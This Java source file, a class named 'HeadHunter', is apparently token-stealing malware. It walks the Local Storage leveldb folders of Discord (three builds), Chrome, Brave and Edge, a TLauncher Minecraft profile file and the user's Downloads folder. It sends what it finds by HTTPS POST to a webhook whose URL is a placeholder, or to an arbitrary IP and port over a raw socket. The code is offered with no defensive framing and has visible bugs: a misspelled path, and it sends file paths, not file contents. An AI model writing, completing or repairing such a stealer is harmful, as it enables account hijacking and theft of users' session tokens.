
import java.net.*;
import javax.net.ssl.*;
import java.io.*;
import java.nio.charset.*;
import java.util.*;

public class HeadHunter {
    public static File var1_1, var1_2, var1_3, var1_4, var1_5, var1_6, var1_7, var1_8;
    public static String appdata = System.getenv("APPDATA");
    public static String lappdata = System.getenv("LOCALAPPDATA");
    public static File downloads = new File(System.getProperty("user.home") + "/downloads");
    public static HttpsURLConnection connection;
    public static OutputStream output;
    public static URL webhook;

    public static void main(String[] args) throws MalformedURLException, IOException {
        webhook = new URL("imagine url here");
        var1_1 = new File(appdata + "/Roaming/discord/Local Storage/leveldb");
        var1_2 = new File(appdata + "/Roaming/discordptb/Local Storage/leveldb");
        var1_3 = new File(appdata + "/Roaming/discordcanary/Local Storage/leveldb");
        var1_4 = new File(appdata + "/Roaming/.minecraft/TlauncherProfiles.json");
        var1_5 = new File(lappdata + "/Google/Chrome/User Data/Default/Loacl Storage/leveldb");
        var1_6 = new File(lappdata + "/BraveSoftware/Brave-Browser/User Data/Default/Local Storage/leveldb");
        var1_7 = new File(lappdata + "/Microsoft/Edge/User Data/Default/Local Storage/leveldb");
        var1_8 = downloads;
        if (var1_1.exists()) {
            for (File file1 : var1_1.listFiles()) {
                if (file1.toString().contains(".ldb")) {
                    send(webhook, file1);
                }
            }
        } else {
            throw new IllegalArgumentException("Folder not found");
        }

        if (var1_2.exists()) {
            for (File file2 : var1_2.listFiles()) {
                if (file2.toString().contains(".ldb")) {
                    send(webhook, file2);
                }
            }
        } else {
            throw new IllegalArgumentException("Folder not found");
        }

        if (var1_3.exists()) {
            for (File file3 : var1_3.listFiles()) {
                if (file3.toString().contains(".ldb")) {
                    send(webhook, file3);
                }
            }
        } else {
            throw new IllegalArgumentException("Folder Not Found!");
        }

        if (var1_4.exists()) {
            try (FileReader reader = new FileReader(var1_4)) {
                BufferedReader reader2 = new BufferedReader(reader);
                do {
                    String key = "\"name\":";
                    if (reader2.readLine().contains(key)) {
                        send(webhook, var1_4);
                    }
                } while (reader2.readLine() != null);
            }
        } else {
            throw new IllegalArgumentException("File Not Found!");
        }

        if (var1_5.exists()) {
            for (File file4 : var1_5.listFiles()) {
                if (file4.toString().contains(".ldb")) {
                    send(webhook, file4);
                }
            }
        } else {
            throw new IllegalArgumentException("Folder Not Found!");
        }

        if (var1_6.exists()) {
            for (File file5 : var1_6.listFiles()) {
                if (file5.toString().contains(".ldb")) {
                    send(webhook, file5);
                }
            }
        } else {
            throw new IllegalArgumentException("Folder Not Found!");
        }

        if (var1_7.exists()) {
            for (File file6 : var1_7.listFiles()) {
                if (file6.toString().contains(".ldb")) {
                    send(webhook, file6);
                }
            }
        } else {
            throw new IllegalArgumentException("Folder Not Found!");
        }

        if (var1_8.exists()) {
            for (File file7 : var1_8.listFiles()) {
                if (file7.toString().contains(".ldb")) {
                    send(webhook, file7);
                }
            }
        } else {
            throw new IllegalArgumentException("Folder Not Found!");
        }
    }

    public static void send(URL url, File file) throws IOException {
        connection = (HttpsURLConnection) url.openConnection();
        connection.setRequestProperty("CONTENT-TYPE", "application/json");
        connection.setRequestMethod("POST");
        output = connection.getOutputStream();
        output.write(file.toString().getBytes(StandardCharsets.UTF_8));
        output.flush();
        output.close();
        connection.getInputStream().close();
        connection.disconnect();
    }

    public static void send(String ip, int port, File file) throws UnknownHostException, IOException {
        Socket socket = new Socket(ip, port);
        OutputStream output = socket.getOutputStream();
        output.write(file.toString().getBytes());
        output.flush();
        output.close();
        socket.getInputStream().close();
        socket.close();
    }
}